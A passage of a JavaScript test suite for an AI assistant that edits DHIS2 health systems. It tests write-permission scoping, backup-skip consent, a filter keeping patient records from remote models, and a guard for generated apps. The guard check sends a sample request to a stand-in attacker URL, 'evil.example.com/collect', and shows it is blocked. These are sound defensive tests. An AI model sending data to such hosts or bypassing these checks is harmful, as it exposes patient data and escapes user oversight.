    scope('Explain the program indicators, no changes.') === 'read_only' && scope('Build a dashboard for the ANC program with no changes to the program itself.') !== 'read_only');
  truthy('real failure reports still switch to save diagnosis ("error saving the enrollment", "an error message when saving", "fails to load")',
    ctx.reportsSaveFailure('I get an error saving the enrollment in Capture') && ctx.reportsSaveFailure('I get an error message when saving the event')
    && ctx.reportsSaveFailure('The enrollment page fails to load') && !ctx.reportsSaveFailure('Build an app with clear loading, error, and no-results messages'));
}

// Inpatient app, second attempt (2026-11-01): four previews refused for
// correct code — a quote inside a regex (the CSV escape /"/g) made the source
// scanner blank the rest of the file ("Nothing is rendered", "<App> is used
// but never declared"). The same turn counted 1,021 events for a program with
// 54,022: DHIS2's event-analytics cache answered with another program's entry.
async function runAppScannerAndAnalyticsCacheChecks() {
  console.log('\nApp source scanner (regex literals, template expressions) + analytics cache mismatches + tracker orgUnitMode:');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const d = ctx.__dhis2();
  const kitMeta = JSON.parse(fs.readFileSync(path.join(ROOT, 'libs/d2-kit/KIT_VERSION.json'), 'utf8'));
  const lintErrors = (src) => ctx.lintCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src).code }, 'app', kitMeta).errors.map((e) => e.message);
  const tail = "\nfunction Alerts() { return null; }\nfunction App() { return <div>Hi</div>; }\nconst CONFIG = { baseUrl: D2_APP_CONFIG.baseUrl, apiVersion: D2_APP_CONFIG.apiVersion };\nReactDOMClient.createRoot(document.getElementById('root')).render(<Provider config={CONFIG}><App /><Alerts /></Provider>);";
  const head = 'const { Provider } = D2Runtime;\n';
  const tricky = [
    "const csvCell = (v) => '\"' + String(v == null ? '' : v).replace(/\"/g, '\"\"') + '\"';\n",
    "const clean = (s) => String(s).replace(/'/g, '');\n",
    "const needsQuote = (s) => /[\",\\n]/.test(s);\n",
    "const noTicks = (s) => s.replace(/`/g, '');\n",
    "const label = (a, b) => `${a} (${b ? `code ${b}` : 'none'})`;\n",
  ];
  truthy('the thread\'s CSV escape (and quotes / backticks inside regexes, nested templates) no longer hide the render call or the components after them',
    tricky.every((mid) => lintErrors(head + mid + tail).length === 0));
  truthy('…while a file that really has no render call is still refused', lintErrors(head + tricky[0] + 'function App() { return null; }').some((m) => /Nothing is rendered/.test(m)));
  const v = ctx.customAppSourceViews('const z = {} / 1; eval("x") / 1; const t = `a ${ eval(`b ${y}`) } c`; const r = /["]/g;');
  truthy('the safety scan still sees code after a division and inside template ${…} (eval stays visible); positions are preserved',
    (v.bare.match(/eval\(/g) || []).length === 2 && v.bare.length === v.code.length && /const r = \/ {3}\/g;/.test(v.bare));
  const safety = ctx.scanCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', head + tricky[0] + 'const s = localStorage.getItem("k");' + tail).code });
  truthy('…and a rule violation after the CSV escape is reported (it was blanked out before)', safety.some((x) => /localStorage/.test(x.match)));

  // Loop guard: a listed-problems refusal repeats only when the problems repeat.
  {
    const saved = { f: d.failedCallSigs, fam: d.toolErrorFamilies };
    d.failedCallSigs = new Map(); d.toolErrorFamilies = new Map();
    try {
      const refusal = (msgs) => ({ _error: `The code would fail at runtime: ${msgs.length} problem(s).`, problems: msgs.map((message) => ({ message })) });
      const a = ctx.noteToolFailure('manage_custom_app', { action: 'preview', n: 1 }, refusal(['Nothing is rendered: call …']));
      const b = ctx.noteToolFailure('manage_custom_app', { action: 'preview', n: 2 }, refusal(['<App> is used but never declared', '<Alerts> is used but never declared']));
      const c = ctx.noteToolFailure('manage_custom_app', { action: 'preview', n: 3 }, refusal(['Nothing is rendered: call …']));
      truthy('different lint problems are different failures for the loop guard; the same problem again counts as a repeat', a.famCount === 1 && b.famCount === 1 && c.famCount === 2);
    } finally { d.failedCallSigs = saved.f; d.toolErrorFamilies = saved.fam; }
  }

  // Analytics answered from another program's / stage's cache entry.
  const savedFetch = ctx.safeDhis2Fetch;
  const progs = vm.runInContext('typeof _knownProgramsCache !== "undefined" ? _knownProgramsCache : null', ctx);
  vm.runInContext('_knownProgramsCache = new Map([["eBAyeGv0exc","Inpatient morbidity and mortality"],["WSGAb5XwJ3Y","WHO RMNCH Tracker"]]); _knownProgramsCacheTs = Date.now(); _programStageIdsCache.set("WSGAb5XwJ3Y", new Set(["WZbXY0S00lP","edqlbukwRfQ"]));', ctx);
  try {
    const rmnchAnswer = { rows: [['ImspTQPwCqd', '1021']], metaData: { items: { WSGAb5XwJ3Y: { name: 'WHO RMNCH Tracker' }, WZbXY0S00lP: { name: 'First antenatal care visit' }, ImspTQPwCqd: { name: 'Sierra Leone' } } } };
    const prog = await ctx.analyticsCacheMismatch('analytics/events/aggregate/eBAyeGv0exc?dimension=ou:USER_ORGUNIT&stage=Zj7UnCAulEk&startDate=2026-01-01&endDate=2026-12-31', rmnchAnswer);
    const stage = await ctx.analyticsCacheMismatch('analytics/events/aggregate/WSGAb5XwJ3Y?dimension=ou:ImspTQPwCqd&stage=edqlbukwRfQ&startDate=2026-07-03&endDate=2026-07-21', rmnchAnswer);
    const same = await ctx.analyticsCacheMismatch('analytics/events/aggregate/WSGAb5XwJ3Y?dimension=ou:ImspTQPwCqd&stage=WZbXY0S00lP&startDate=2026-07-03&endDate=2026-07-21', rmnchAnswer);
    const noMeta = await ctx.analyticsCacheMismatch('analytics/events/aggregate/eBAyeGv0exc?dimension=ou:ImspTQPwCqd&skipMeta=true', { rows: [['x', '1']] });
    truthy('an event-analytics answer that names another program (the thread: RMNCH\'s 1,021 for Inpatient) or another stage of the same program is refused; a matching or meta-less answer passes',
      prog?._analytics_cache_mismatch?.answered === 'WSGAb5XwJ3Y' && /another program \("WHO RMNCH Tracker"/.test(prog._error) && stage?._analytics_cache_mismatch?.kind === 'stage' && /First antenatal care visit/.test(stage._error) && same === null && noMeta === null);
    // count_records: a mismatched analytics answer → live tracker count.
    const calls = [];
    ctx.safeDhis2Fetch = async (p) => {
      calls.push(p);
      if (/^programStages\/Zj7UnCAulEk/.test(p)) return { program: { id: 'eBAyeGv0exc' } };
      if (/^analytics\/events\/aggregate\/eBAyeGv0exc/.test(p)) return { _error: 'DHIS2 answered this analytics query with the cached result of another program', _analytics_cache_mismatch: { requested: 'eBAyeGv0exc', answered: 'WSGAb5XwJ3Y', kind: 'program' } };
      if (/^tracker\/events\?/.test(p)) return { pager: { page: 1, pageSize: 1, total: 54022 } };
      return {};
    };
    const savedOu = d.orgUnitContext;
    const c = await ctx.executeTool('count_records', { record_type: 'events', program_override: 'eBAyeGv0exc', stage_id: 'Zj7UnCAulEk', date_after: '2026-01-01', date_before: '2026-12-31', include_children: true });
    const tr = calls.find((p) => /^tracker\/events\?/.test(p)) || '';
    truthy('count_records then counts the live records (54,022 in the thread, not 1,021) and says why; with no org unit it counts the user\'s own units (CAPTURE), not orgUnit=USER_ORGUNIT',
      c.count === 54022 && c._method === 'tracker_live_count' && /cache/.test(c._note || '') && /ouMode=CAPTURE|orgUnitMode=CAPTURE/.test(tr) && !/orgUnit=USER_ORGUNIT/.test(tr));
    d.orgUnitContext = savedOu;
  } finally {
    ctx.safeDhis2Fetch = savedFetch;
    vm.runInContext(`_knownProgramsCache = ${progs ? 'null' : 'null'}; _knownProgramsCacheTs = 0; _programStageIdsCache.delete("WSGAb5XwJ3Y");`, ctx);
  }

  // tracker/* ouMode → orgUnitMode on 2.41+ (ouMode is silently ignored there).
  {
    const savedF = ctx.fetch; const savedVer = d.apiVersion; const savedBase = d.baseUrl;
    const urls = [];
    ctx.fetch = (url) => { urls.push(String(url)); return Promise.resolve({ ok: true, status: 200, type: 'basic', text: async () => '{"pager":{"page":1,"pageSize":1,"total":5},"events":[]}' }); };
    d.baseUrl = d.baseUrl || 'https://verify.example/dhis';
    try {
      d.apiVersion = '42';
      await ctx.__realSafeDhis2Fetch('tracker/enrollments?program=WSGAb5XwJ3Y&orgUnit=ImspTQPwCqd&ouMode=DESCENDANTS&pageSize=1&totalPages=true');
      d.apiVersion = '40';
      await ctx.__realSafeDhis2Fetch('tracker/enrollments?program=WSGAb5XwJ3Y&orgUnit=ImspTQPwCqd&ouMode=DESCENDANTS&pageSize=1&totalPages=true');
      truthy('on 2.41+ a tracker request\'s ouMode is sent as orgUnitMode (2.42/2.43 ignore ouMode and answer 0); 2.40 keeps ouMode',
        /orgUnitMode=DESCENDANTS/.test(urls[0]) && !/[?&]ouMode=/.test(urls[0]) && /[?&]ouMode=DESCENDANTS/.test(urls[1]));
    } finally { ctx.fetch = savedF; d.apiVersion = savedVer; d.baseUrl = savedBase; }
  }
}

// Security review 2026-10-29: patient data in model payloads, write scope,
// skip_backup consent, generated-app runtime policy, multilingual intent.
async function runSecurityReviewChecks() {
  console.log('\nSecurity review 2026-10-29 (privacy egress, write scope, backup consent, app runtime policy, multilingual):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const d = ctx.__dhis2();
  const remote = { providerType: 'openai', apiBaseUrl: 'https://api.fireworks.ai/inference/v1' };
  const local = { providerType: 'openai', apiBaseUrl: 'http://localhost:11434/v1' };

  // 1. Outbound patient-data filter + the save-error prefetch.
  const diagMsg = { role: 'system', content: '[Save-error diagnostic context]\n' + JSON.stringify({ existing_enrollments: { enrollments: [{ enrollment: 'Abc123XyZ90', status: 'ACTIVE', enrolledAt: '2026-01-01', orgUnit: 'DiszpKrYNg8' }] } }) };
  const meta = { role: 'tool', tool_call_id: 't1', content: JSON.stringify({ programs: [{ id: 'WSGAb5XwJ3Y', name: 'WHO RMNCH Tracker' }] }) };
  const userMsg = { role: 'user', content: '{"enrollment":"Abc123XyZ90","enrolledAt":"2026-01-01"}' };
  const outR = ctx.filterPatientDataForProvider([diagMsg, meta, userMsg], remote);
  const outL = ctx.filterPatientDataForProvider([diagMsg, meta, userMsg], local);
  truthy('privacy egress: a system/tool message carrying a tracker record is removed before a REMOTE model sees it; metadata and the user\'s own text pass; a local model gets everything',
    /_privacy_redacted/.test(outR[0].content) && !/Abc123XyZ90/.test(outR[0].content) && outR[1] === meta && outR[2] === userMsg && outL[0] === diagMsg);
  {
    const saved = ctx.safeDhis2Fetch; const paths = [];
    const savedCfg = vm.runInContext('_cachedProviderConfig', ctx);
    vm.runInContext(`_cachedProviderConfig = ${JSON.stringify(remote)};`, ctx);
    ctx.safeDhis2Fetch = async (p) => { paths.push(p); return p.startsWith('programs/') ? { id: 'WSGAb5XwJ3Y', organisationUnits: [{ id: 'a' }] } : { id: 'u', organisationUnits: [] }; };
    try {
      const diag = await ctx.prefetchSaveErrorContext({ programId: 'WSGAb5XwJ3Y', teiId: 'Abc123XyZ90' });
      truthy('save-error prefetch on a cloud provider does not read the person\'s enrollments (no tracker call) and says so', !paths.some((p) => p.startsWith('tracker/')) && diag.existing_enrollments === undefined && /not read/.test(diag.existing_enrollments_note || ''));
    } finally { ctx.safeDhis2Fetch = saved; vm.runInContext(`_cachedProviderConfig = ${JSON.stringify(savedCfg)};`, ctx); }
  }

  // 2 + 5. Write scope bound to what was asked; multilingual.
  const cls = (t) => ctx.classifyWriteAuthorization(t).scope;
  truthy('write scope: "explain how to delete", "do not make any changes; explain…", "how do I create…" are read-only; a plain instruction is not',
    cls('Can you explain how to delete a program?') === 'read_only' && cls('Do not make any changes; explain how to create a dashboard.') === 'read_only'
    && cls('How do I create a dashboard?') === 'read_only' && cls('Create a dashboard for the WHO RMNCH Tracker program') === 'broad');
  truthy('multilingual: Arabic / French / Spanish / Portuguese instructions authorize, their negations and how-to questions do not',
    cls('أنشئ لوحة معلومات لبرنامج رعاية الأمومة') === 'broad' && cls('احذف هذا المؤشر') === 'broad' && cls('لا تحذف هذا المؤشر') === 'read_only'
    && cls('كيف أنشئ لوحة معلومات؟') === 'read_only' && cls('Supprime cet indicateur') === 'broad' && cls('Ne supprime pas cet indicateur') === 'read_only'
    && cls('Elimina este indicador') === 'broad' && cls('Não exclua este indicador') === 'read_only');
  truthy('multilingual routing: an Arabic dashboard request is routed to the dashboard tools',
    ctx.getContextualTools({}, ctx.buildRoutingText('أنشئ لوحة معلومات لبرنامج رعاية الأمومة'), false).some((t) => t.function.name === 'manage_dashboards'));
  {
    const saved = { wa: d.writeAuth, mine: d.assistantCreatedIds };
    try {
      d.writeAuth = ctx.classifyWriteAuthorization('Create a dashboard for the WHO RMNCH Tracker program');
      const del = ctx.requireWriteAuth('manage_metadata', 'delete', { object_type: 'dashboards', object_id: 'Dash0000001' });
      const create = ctx.requireWriteAuth('manage_dashboards', 'create_dashboard');
      ctx.noteAssistantCreatedIds(['Viz00000001']);
      const own = ctx.requireWriteAuth('manage_metadata', 'delete', { object_type: 'visualizations', object_id: 'Viz00000001' });
      truthy('a "create" request does not authorize deleting an existing object, but does allow creating and removing the assistant\'s own new objects',
        del && del._scope === 'delete_not_requested' && create === null && own === null);
      // scoped "yes": bound to the proposed tool + action, no widening
      d.writeAuth = { scope: 'read_only', reason: 't' };
      ctx.requireWriteAuth('manage_program_indicators', 'update', { indicator_id: 'Ind00000001' });
      vm.runInContext('conversationHistory = [];', ctx);
      d.writeAuth = ctx.classifyWriteAuthorization('yes');
      const upd = ctx.requireWriteAuth('manage_program_indicators', 'update', { indicator_id: 'Ind00000001' });
      const upd2 = ctx.requireWriteAuth('manage_program_indicators', 'update', { indicator_id: 'Ind00000001' });
      const delSame = ctx.requireWriteAuth('manage_program_indicators', 'delete', { indicator_id: 'Ind00000001' });
      const other = ctx.requireWriteAuth('manage_dashboards', 'create_dashboard');
      truthy('a bare "yes" approves exactly the proposed update (repeatable) — not a delete with the same tool, not another tool, and it never widens',
        d.writeAuth.scope === 'scoped' && upd === null && upd2 === null && !!delSame && !!other && d.writeAuth.scope === 'scoped');
    } finally { d.writeAuth = saved.wa; d.assistantCreatedIds = saved.mine; }
  }

  // 3. skip_backup needs recorded consent.
  {
    const saved = { failure: d.lastBackupFailure, harness: d.harnessSkipBackupConsent };
    try {
      d.harnessSkipBackupConsent = false;
      vm.runInContext('lastUserText = "delete the old chart";', ctx);
      const no = ctx.backupSkipConsent('manage_metadata', { skip_backup: true });
      vm.runInContext('lastUserText = "delete it without a backup";', ctx);
      const said = ctx.backupSkipConsent('manage_metadata', { skip_backup: true });
      d.lastBackupFailure = { tool: 'manage_metadata', turn: (d.turnCounter || 0) - 1 };
      vm.runInContext('lastUserText = "yes";', ctx);
      const yesAfterFailure = ctx.backupSkipConsent('manage_metadata', { skip_backup: true });
      const yesOtherTool = ctx.backupSkipConsent('manage_dashboards', { skip_backup: true });
      truthy('skip_backup needs the user\'s own words or a "yes" to THAT tool\'s reported backup failure — the model setting it is not consent',
        !no.ok && said.ok && yesAfterFailure.ok && !yesOtherTool.ok);
    } finally { d.lastBackupFailure = saved.failure; d.harnessSkipBackupConsent = saved.harness; vm.runInContext('lastUserText = "";', ctx); }
  }

  // 4. Generated apps: CSP + runtime guard (not just the static scan).
  {
    const spec = { name: 'x', needsWriteAccess: false, pluginType: null, usesEcharts: false, sources: { 'app.jsx': '' } };
    const html = ctx.buildCustomAppHtml(spec, 'app.js');
    const guardSrc = ctx.buildCustomAppGuardJs(spec);
    truthy('generated app pages carry a connect-src \'self\' CSP and load app-guard.js before any other script',
      /Content-Security-Policy" content="connect-src 'self'/.test(html) && html.indexOf('app-guard.js') < html.indexOf('d2-kit.min.js'));
    const calls = [];
    const win = { location: { origin: 'https://dhis.example.org', href: 'https://dhis.example.org/api/apps/x/index.html' }, fetch: (u, i) => { calls.push([u, i && i.method]); return Promise.resolve('ok'); }, XMLHttpRequest: function () {}, console: { error() {} } };
    win.XMLHttpRequest.prototype.open = function () { calls.push(['xhr']); };
    const nav = {};
    vm.runInNewContext(guardSrc, { window: win, navigator: nav, console: { error() {} }, URL, Promise, Error, String, Object });
    const u = 'https://evil.example.com/collect'; const m = 'POST';
    const r1 = await win.fetch(u).then(() => 'sent', () => 'blocked');
    const r2 = await win.fetch('/api/dataStore/x/y', { method: m }).then(() => 'sent', () => 'blocked');
    const r3 = await win.fetch('/api/programs.json').then(() => 'sent', () => 'blocked');
    let x1 = 'sent'; try { new win.XMLHttpRequest().open(m, '/api/x'); } catch (e) { x1 = 'blocked'; }
    truthy('runtime guard: a URL or method held in a variable is still enforced — external request and POST from a read-only app blocked, same-server GET allowed',
      r1 === 'blocked' && r2 === 'blocked' && r3 === 'sent' && x1 === 'blocked' && calls.length === 1);
    const rwGuard = ctx.buildCustomAppGuardJs({ ...spec, needsWriteAccess: true });
    truthy('…an app declared needs_write_access may POST to its own server', /var READ_ONLY = false/.test(rwGuard));
  }
}

// ── Malaria Testing and Treatment Review thread (2026-11-03, play 2.42.7) ─────
// Two charts saved with no category showed "There was an error loading data"; the
// line-list tool was not offered for "a detailed table of events" while a refusal
// said it was; a metadata-only request ran 13 analytics queries; a 600-point bubble
// map was one blob; **bold** showed its stars on a text tile.
async function runMalariaThreadChecks() {
  console.log('\nMalaria thread (charts need a category, line lists reachable, metadata only):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const pis = Array.from({ length: 12 }, (_, i) => `piA${String(i).padStart(8, '0')}`);
  const typeMap = Object.fromEntries(pis.map(id => [id, 'PROGRAM_INDICATOR']));
  const build = (over) => ctx.buildVisualizationObject({ name: 'T', vis_type: 'BAR', data_items: pis, periods: ['2026'], org_units: ['ImspTQPwCqd'], ...over }, typeMap);
  const axes = (b) => `${(b.viz.rowDimensions || []).join('+')}|${(b.viz.columnDimensions || []).join('+')}|${(b.viz.filterDimensions || []).join('+')}`;

  const noCat = build({ layout: { columns: ['dx'], rows: [], filters: ['ou', 'pe'] } });
  truthy('several data items, one period, one place, no category: the items become the bars', axes(noCat) === 'dx|pe|ou');
  truthy('…and the model is told', /without a category/.test(noCat.layoutNote || ''));
  truthy('…keep_layout does not save a chart that cannot draw', axes(build({ keep_layout: true, layout: { columns: ['dx'], rows: [], filters: ['ou', 'pe'] } })) === 'dx|pe|ou');
  truthy('no category with one data item: the period is the category', axes(build({ data_items: pis.slice(0, 1), layout: { columns: ['dx'], filters: ['ou', 'pe'] } })) === 'pe|dx|ou');
  truthy('no category with a level in the filter: the units are the category', axes(build({ org_units: ['ImspTQPwCqd', 'LEVEL-2'], layout: { columns: ['dx'], rows: [], filters: ['ou', 'pe'] } })) === 'ou|dx|pe');
  truthy('no category with months in the filter: the months are the category', axes(build({ periods: ['LAST_12_MONTHS'], layout: { columns: ['dx'], rows: [], filters: ['ou', 'pe'] } })) === 'pe|dx|ou');
  truthy('a radar needs a category too', axes(build({ vis_type: 'RADAR' })) === 'dx|pe|ou');
  truthy('pie, gauge and single value still have none', ['PIE', 'GAUGE', 'SINGLE_VALUE'].every(t => (build({ vis_type: t }).viz.rowDimensions || []).length === 0));
  truthy('data items on the axis with one period are left there', axes(build({ layout: { category: ['dx'], series: ['pe'], filters: ['ou'] } })) === 'dx|pe|ou');
  truthy('data items on the axis with twelve months are still swapped', axes(build({ periods: ['LAST_12_MONTHS'], layout: { category: ['dx'], series: ['pe'], filters: ['ou'] } })) === 'pe|dx|ou');
  truthy('a dimension sent on two axes is saved on one', axes(build({ periods: ['LAST_12_MONTHS'], layout: { series: ['dx'], category: ['pe'], filters: ['pe', 'ou'] } })) === 'pe|dx|ou');
  truthy('a pivot layout is untouched', axes(build({ vis_type: 'PIVOT_TABLE', layout: { rows: ['ou'], columns: ['dx'], filters: ['pe'] } })) === 'ou|dx|pe');

  const need = (rows, vt) => ctx.dashTileNeeds({ itemType: 'VISUALIZATION', vizType: vt, name: 'x', rows: [{ dimension: 'dx', items: pis.slice(0, rows) }], columns: [{ dimension: 'pe', items: ['2026'] }] });
  truthy('long labels on the axis take the full width', need(9, 'COLUMN').wide === true && need(4, 'COLUMN').wide === false);
  truthy('horizontal bars get a line each', ctx.dashTileNeeds({ itemType: 'VISUALIZATION', vizType: 'BAR', name: 'x', rows: [{ dimension: 'dx', items: Array(20).fill('a') }], columns: [] }).h >= 30);

  const y = ctx.namedYearPeriods;
  truthy('a named year fixes "this year" periods', JSON.stringify(y(['THIS_YEAR'], 'Start with 2026 across all locations').periods) === '["2026"]');
  truthy('…months', y(['MONTHS_THIS_YEAR'], 'for 2026').periods.length === 12 && y(['MONTHS_THIS_YEAR'], 'for 2026').periods[11] === '202612');
  truthy('…quarters', y(['QUARTERS_THIS_YEAR'], 'for 2026').periods[3] === '2026Q4');
  truthy('no year, two years, or "this year" in the request: left relative',
    y(['THIS_YEAR'], 'monthly chart') === null && y(['THIS_YEAR'], '2025 and 2026') === null && y(['THIS_YEAR'], 'this year against 2025') === null);
  truthy('other relative periods are left alone', y(['LAST_12_MONTHS'], 'for 2026') === null);

  truthy('a text tile\'s **bold** becomes *bold*, __italic__ becomes _italic_', ctx.dashboardTextMarkup('a **b c** d __e__ *f*') === 'a *b c* d _e_ *f*');

  const toolsFor = (text, appType = 'Maintenance') => ctx.getContextualTools({ appType }, text, false, text).map(t => t.function.name);
  truthy('"a detailed table of events" offers the line-list tool', toolsFor('A detailed table of events recorded as Referred ACT stockout, showing date and facility').includes('manage_line_lists'));
  truthy('"a table of Positive or Mixed RDT events" offers it', toolsFor('A separate table of Positive or Mixed RDT events ordered by date').includes('manage_line_lists'));
  truthy('any dashboard request offers line lists, maps and legend sets', ['manage_line_lists', 'manage_maps', 'manage_legend_sets'].every(n => toolsFor('Create a dashboard called X').includes(n)));
  truthy('so does the Dashboard app', toolsFor('add a tile', 'Dashboard').includes('manage_line_lists'));
  truthy('an unrelated question does not', !toolsFor('how many data elements does this program have').includes('manage_line_lists'));

  const m = ctx.userAskedMetadataOnly;
  truthy('"use metadata only during development" is a metadata-only request', m('Discover it yourself. Use metadata only during development.'));
  truthy('…"do not fetch any data"', m('Build it but do not fetch any data'));
  truthy('…not "metadata-only sharing", "export metadata only", "do not touch the data", "no patient data"',
    !m('create it with metadata only sharing') && !m('export metadata only') && !m('change the form, do not touch the data') && !m('Check definitions without fetching patient data'));
  {
    const d = vm.runInContext('dhis2', ctx);
    const was = d.metadataOnlyTurn;
    d.metadataOnlyTurn = true;
    const gate = ctx.metadataOnlyGate;
    truthy('metadata only: analytics is refused', /metadata only/.test(gate('dhis2_query', { path: 'analytics?dimension=dx:a' })?._error || ''));
    truthy('…event aggregates too', !!gate('dhis2_query', { path: '/api/42/analytics/events/aggregate/abcdefghij1?dimension=x' }));
    truthy('…record counts too', !!gate('count_records', { record_type: 'events' }));
    truthy('…metadata reads pass', gate('dhis2_query', { path: 'programs?fields=id' }) === null && gate('get_program_info', {}) === null);
    truthy('…a write passes (the write gates decide)', gate('dhis2_query', { path: 'analytics', method: 'POST' }) === null);
    const a = { visualization_id: 'x' };
    truthy('…a chart can be read, without its values', gate('get_visualization_details', a) === null && a.include_analytics_preview === false);
    d.metadataOnlyTurn = false;
    truthy('off: nothing is refused', gate('dhis2_query', { path: 'analytics?dimension=dx:a' }) === null);
    d.metadataOnlyTurn = was;
  }

  const idDim = ctx.analyticsRecordIdDimension;
  truthy('a record id is refused as an analytics dimension', ['psi', 'event', 'eventId', 'EVENT_ID'].every(n => /not an analytics dimension/.test(idDim(`analytics/events/aggregate/abcdefghij1?dimension=${n}&stage=x`)?._error || '')));
  truthy('…a real dimension passes', idDim('analytics/events/aggregate/abcdefghij1?dimension=ou:ImspTQPwCqd&dimension=hKZh1et5n7v') === null);
  truthy('…other endpoints are not affected', idDim('analytics?dimension=event') === null);

  const mapBuilt = (over) => ctx.buildMapObject({ name: 'M', data_item: 'piA00000000', org_unit_level: 4, thematic_map_type: 'BUBBLE', period: '2026', ...over }, typeMap).map.mapViews.find(v => v.layer === 'thematic');
  truthy('600 facilities get small bubbles', mapBuilt({ _drawn_units: 601 }).radiusLow === 2 && mapBuilt({ _drawn_units: 601 }).radiusHigh === 10 && mapBuilt({ _drawn_units: 601 }).opacity === 0.75);
  truthy('13 districts keep the usual sizes', mapBuilt({ _drawn_units: 13 }).radiusHigh === 30);
  truthy('asked-for sizes win', mapBuilt({ _drawn_units: 601, radius_low: 4, radius_high: 20 }).radiusHigh === 20);
  truthy('a choropleth has no radius', mapBuilt({ thematic_map_type: 'CHOROPLETH' }).radiusHigh === undefined);

  const llCtx = { program: { name: 'P', programType: 'WITHOUT_REGISTRATION' }, stages: [], stagesById: new Map(), teas: new Map(), des: new Map([['deIdentif01', { id: 'deIdentif01', name: 'Case number', stageIds: ['stageOnly01'] }]]), pis: new Map(), teaByName: new Map(), deByName: new Map([['case number', 'deIdentif01']]), piByName: new Map() };
  const idCol = await ctx.lineListResolveDimension('Event ID', llCtx, 'EVENT', new Map(), 'column');
  truthy('a line list refuses an event id column and says what to do', idCol._scope === 'line_list_no_record_id' && /Changed from your request/.test(idCol._hint));
  const psiCol = await ctx.lineListResolveDimension('psi', llCtx, 'EVENT', new Map(), 'column');
  truthy('…and "psi"', psiCol._scope === 'line_list_no_record_id');
  const realCol = await ctx.lineListResolveDimension('Case number', llCtx, 'EVENT', new Map(), 'column');
  truthy('…but a real field named like one is the field', realCol._scope !== 'line_list_no_record_id');

  {
    const d = vm.runInContext('dhis2', ctx);
    const was = d.turnLedger;
    d.turnLedger = {};
    const led = ctx.noteTurnLedger;
    led('manage_program_indicators', { action: 'create' }, { success: true, program_indicator_ids: ['a', 'b', 'c'] });
    led('manage_dashboards', { action: 'create_visualization' }, { success: true, visualization_id: 'v1' });
    led('manage_dashboards', { action: 'create_visualization' }, { success: true, visualization_id: 'v2' });
    led('manage_maps', { action: 'create' }, { success: true, map_id: 'm1' });
    const afterDash = led('manage_dashboards', { action: 'create_dashboard' }, { success: true, dashboard_id: 'd1', new_visualizations: [{ id: 'v3' }] });
    truthy('the ledger counts what was saved', afterDash === '3 program indicators, 3 visualizations, 1 map, 1 dashboard');
    truthy('…a deleted object leaves it', led('manage_metadata', { action: 'delete', object_type: 'visualizations', object_id: 'v2' }, { success: true }) === '3 program indicators, 2 visualizations, 1 map, 1 dashboard');
    truthy('…a failure or a dry run changes nothing', led('manage_maps', { action: 'create' }, { _error: 'x' }) === null && led('manage_maps', { action: 'create' }, { dry_run: true, map_id: 'zz' }) === null);
    d.turnLedger = was;
  }

  const held = (over, type = 'WITH_REGISTRATION') => { const pi = { name: 'P', analyticsType: 'EVENT', aggregationType: 'AVERAGE', expression: 'd2:condition("#{sssssssssss.ddddddddddd} < 2500", 100, 0)', filter: "V{program_stage_id} == 'sssssssssss'", ...over }; return { note: ctx.piOnlyHeldEvents(pi, type), filter: pi.filter }; };
  truthy('a tracker percentage leaves scheduled visits out, like V{event_count}', /event_status/.test(held({}).filter) && /scheduled visits/.test(held({}).note));
  truthy('…and a sum of a data element', /event_status/.test(held({ aggregationType: 'SUM' }).filter));
  truthy('…with no filter, the filter is the status', held({ filter: '' }).filter === "(V{event_status} == 'ACTIVE' || V{event_status} == 'COMPLETED')");
  truthy('…an OR filter is bracketed first, so the status applies to all of it', held({ filter: "#{sssssssssss.ddddddddddd} > 1 || #{sssssssssss.eeeeeeeeeee} > 1" }).filter.startsWith('(#{'));
  truthy('…an event program, a plain count, an enrollment indicator and a filter already on status are left alone',
    held({}, 'WITHOUT_REGISTRATION').note === null && held({ aggregationType: 'COUNT', expression: 'V{event_count}' }).note === null
    && held({ analyticsType: 'ENROLLMENT' }).note === null && held({ filter: "V{event_status} == 'SCHEDULE'" }).note === null);
  const axes2 = ctx.collectionReadEmptyAxesNote;
  truthy('a collection read of line lists or maps asking for their layout is told the empties mean nothing',
    /mean nothing/.test(axes2('eventVisualizations?fields=id,columns&filter=id:in:[a,b]') || '') && /manage_maps/.test(axes2('maps?fields=mapViews%5Bcolumns%5D') || '') && /mean nothing/.test(axes2('eventVisualizations.json?fields=:all') || ''));
  truthy('…one object, other fields and other resources get no note',
    axes2('eventVisualizations/abcdefghij1?fields=columns') === null && axes2('maps?fields=id,name') === null && axes2('visualizations?fields=columns') === null);
  const agg = ctx.healEventAggregationValue;
  const av = agg('analytics/events/aggregate/abcdefghij1?dimension=ou:ImspTQPwCqd&dimension=Zj7UnCAulEk.qrur9Dvnyt5&stage=Zj7UnCAulEk&aggregationType=AVERAGE');
  truthy('an event average names its item in value=', av.healed && /value=qrur9Dvnyt5/.test(av.path) && !/dimension=Zj7UnCAulEk/.test(av.path));
  truthy('…a count drops the aggregation type', !/aggregationType/.test(agg('analytics/events/aggregate/abcdefghij1?dimension=ou:x&aggregationType=COUNT').path));
  truthy('…also when split by a field', (() => { const r = agg('analytics/events/aggregate/abcdefghij1?dimension=ou:x&stage=s&dimension=UXz7xuGCEhU&aggregationType=COUNT'); return r.healed && !/aggregationType/.test(r.path) && /dimension=UXz7xuGCEhU/.test(r.path); })());
  truthy('…value= already there, two items, or another endpoint: untouched',
    !agg('analytics/events/aggregate/abcdefghij1?value=qrur9Dvnyt5&aggregationType=AVERAGE').healed
    && !agg('analytics/events/aggregate/abcdefghij1?dimension=qrur9Dvnyt5&dimension=oZg33kd9taw&aggregationType=AVERAGE').healed
    && !agg('analytics?dimension=dx:a&aggregationType=AVERAGE').healed);
  const heal = ctx.healBareInFilter;
  truthy('filter=id:in:a,b gets its brackets', heal('visualizations?fields=id&filter=id:in:aaa,bbb&pageSize=5') === 'visualizations?fields=id&filter=id:in:[aaa,bbb]&pageSize=5');
  truthy('…also percent-encoded, and !in', heal('visualizations?filter=id%3Ain%3Aaaa%2Cbbb') === 'visualizations?filter=id:in:[aaa,bbb]' && heal('x?filter=level:!in:1,2') === 'x?filter=level:!in:[1,2]');
  truthy('…a correct or other filter is left alone', heal('x?filter=id:in:[a,b]') === 'x?filter=id:in:[a,b]' && heal('x?filter=name:ilike:in:a') === 'x?filter=name:ilike:in:a' && heal('x?fields=id') === 'x?fields=id');
